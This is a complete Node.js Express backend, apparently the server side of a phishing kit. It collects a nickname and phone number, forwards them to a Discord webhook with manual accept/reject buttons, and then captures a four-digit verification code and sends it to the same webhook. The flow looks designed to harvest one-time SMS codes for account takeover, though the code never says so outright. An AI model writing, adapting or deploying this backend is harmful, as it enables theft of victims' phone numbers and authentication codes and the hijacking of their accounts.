
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

let currentRequest = {};

app.post('/send', async (req, res) => {
  const { pseudo, numero } = req.body;
  currentRequest = { pseudo, numero, id: Date.now() };

  await fetch(process.env.DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      content: null,
      embeds: [{
        title: "Nouvelle Demande",
        fields: [
          { name: "👤 Pseudo", value: pseudo },
          { name: "📱 Numéro", value: numero },
          { name: "🔢 ID", value: currentRequest.id.toString() }
        ],
        color: 5814783
      }],
      components: [{
        type: 1,
        components: [
          {
            type: 2,
            label: "✅ Accepter",
            style: 3,
            custom_id: "approve_" + currentRequest.id
          },
          {
            type: 2,
            label: "❌ Refuser",
            style: 4,
            custom_id: "reject_" + currentRequest.id
          }
        ]
      }]
    })
  });

  res.sendStatus(200);
});

app.post('/code', async (req, res) => {
  const { code } = req.body;
  if (currentRequest && currentRequest.pseudo) {
    await fetch(process.env.DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        embeds: [{
          title: "Code Reçu",
          description: `🔐 Code à 4 chiffres : **${code}**
👤 ${currentRequest.pseudo}
📱 ${currentRequest.numero}`,
          color: 16711680
        }]
      })
    });
  }
  res.sendStatus(200);
});

app.listen(PORT, () => console.log('Serveur backend D3ku lancé sur le port', PORT));
